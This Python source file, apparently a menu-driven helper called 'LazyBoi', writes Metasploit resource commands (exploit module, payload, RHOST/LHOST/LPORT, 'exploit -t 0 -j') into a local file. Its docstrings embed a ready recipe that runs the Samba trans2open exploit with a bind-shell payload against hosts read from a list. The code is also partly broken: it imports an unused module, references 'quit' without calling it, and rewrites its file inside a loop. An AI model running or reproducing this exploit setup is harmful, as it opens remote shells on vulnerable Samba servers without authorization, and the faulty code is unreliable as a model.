import os 
import sys
import sqlmapdir
import re
import linecache


def oute(a, ab, ac, ad, ae, af, ag):
    items = []
    meta = open('meta.py')
    _lines = meta.readlines()
    for i in _lines:
        items.append(i)
    out = []
    for i in items:
        if str(a) not in i:
            out.append(i)
    c = []
    for b in out:
        if str(ab) not in b:
            c.append(b)
    d = []
    for c in c:
        if str(ac) not in c:
            d.append(c)
    e = []
    for d in d:
        if str(ad) not in d:
            e.append(d)
    f = []
    for e in e:
        if str(ae) not in e:
            f.append(e)
    g = []
    for f in f:
        if str(af) not in f:
            g.append(f)
    h = []
    for g in g:
        if str(ag) not in g:
            h.append(g)
    print("")
    print("Old metasploit host data: \n" + ''.join(_lines))
    print("")
    print("WARNING: LazyBoi stores current metasploit host data in your local directory.")
    print("           any existing metasploit host data (above) is going to be replaced.")
    print("Press 0 to cancel")
    global listed
    listed = h
    




def exploit(a):
    '''
    use exploit/linux/samba/trans2open
    set TARGET 0
    set PAYLOAD generic/shell_bind_tcp
    set LHOST 10.0.0.58
    set LPORT 15588
    set RHOSTS file:/home/korrupt/sambasploit/aa
    set RPORT 139
    exploit -t 0 -j
    '''
    items = []
    meta = open('meta.py')
    _lines = meta.readlines()
    for i in _lines:
        items.append(i)
    out = []
    for i in items:
        if 'use' not in i:
            out.append(i)
        # define name of temporary dummy file
        f = open("meta.py", "w")
        f.write(''.join(out))
    dummy_file = 'meta.py' + 'temp'
    # open original file in read mode and dummy file in write mode
    with open('meta.py', 'r') as read_obj, open(dummy_file, 'w') as write_obj:
        # Write given line to the dummy file
        write_obj.write("use " + a)
        write_obj.write("\n")
        # Read lines from original file one by one and append them to the dummy file
        for line in read_obj:
            write_obj.write(line)
    # remove original file
    os.remove("meta.py")
    # Rename dummy file as the original file
    os.rename(dummy_file, "meta.py")
    f = open("meta.py", 'a')
    f.close()
    menu()





def payload(a):
    '''
    use exploit/linux/samba/trans2open
    set TARGET 0
    set PAYLOAD generic/shell_bind_tcp
    set LHOST 10.0.0.58
    set LPORT 15588
    set RHOSTS file:/home/korrupt/sambasploit/aa
    set RPORT 139
    exploit -t 0 -j
    '''
    items = []
    meta = open('meta.py')
    _lines = meta.readlines()
    for i in _lines:
        items.append(i)
    out = []
    for i in items:
        if 'PAYLOAD' not in i:
            out.append(i)
        f = open("meta.py", "w")
        f.write(''.join(out))
        # define name of temporary dummy file
    dummy_file = 'meta.py' + 'temp'
    # open original file in read mode and dummy file in write mode
    with open('meta.py', 'r') as read_obj, open(dummy_file, 'w') as write_obj:
        # Write given line to the dummy file
        write_obj.write("set PAYLOAD " + a)
        write_obj.write("\n")
        # Read lines from original file one by one and append them to the dummy file
        for line in read_obj:
            write_obj.write(line)
    # remove original file
    os.remove("meta.py")
    # Rename dummy file as the original file
    os.rename(dummy_file, "meta.py")
    f = open("meta.py", 'a')
    f.close()
    menu()



def menu():
    m7 = print(" [1] Exploits")
    m7 = print(" [2] Payloads")
    m7 = print(" [3] Set Values")
    m7 = print(" [4] Print Current Metasploit Host Data")
    m7 = print(" [5] Main Menu")
    m6 = print(" [0] Exit")
    m7 = input("")
    m7 = int(m7)
    if m7 == 1:
        print("NOTE: Until I add an exploitation selector, please enter them manually.")
        expl = input("Enter an exploit to use: ")
        print("")
        exploit(expl)
    if m7 == 2:
        print("NOTE: Until I add an exploitation selector, please enter them manually.")
        print("")
        payl = input("Enter a Payload to use: ")
        payload(payl)
    if m7 == 3:
        meta = open('meta.py')
        oute('RHOST', 'RPORT', 'LHOST', 'LPORT', 'SRVHOST', 'SRVPORT', 'exploit -t')
        rhost = input("RHOST: ")
        if rhost == '0':
            menu()
        rport = input("RPORT: ")
        lhost = input("LHOST: ")
        lport = input("LPORT: ")
        srvhost = input("SRVHOST: ")
        srvport = input("SRVPORT: ")
        f = open("meta.py", "w")
        '''
        for line in read_obj:
            write_obj.write(line)
        use exploit/linux/samba/trans2open
        set TARGET 0
        set PAYLOAD generic/shell_bind_tcp
        set LHOST 10.0.0.58
        set LPORT 15588
        set RHOSTS file:/home/korrupt/sambasploit/aa
        set RPORT 139
        exploit -t 0 -j
        '''
        f.write(''.join(listed))
        f.write("set RHOST = " + rhost)
        f.write('\n')
        f.write("set RPORT = " + rport)
        f.write('\n')
        f.write("set LHOST = " + lhost)
        f.write('\n')
        f.write("set LPORT = " + lport)
        f.write('\n')
        f.write("set SRVHOST = " + srvhost)
        f.write('\n')
        f.write("set SRVPORT = " + srvport)
        f.write('\n')
        f.write("exploit -t 0 -j")
        f.close()
        menu()
    if m7 == 4:
        meta = open('meta.py')
        _lines = meta.readlines()
        print("Current Metasploit Host Data: \n" + ''.join(_lines))
        menu()
    if m7 == 5:
        quit
    elif m7 == 0:
        sys.exit()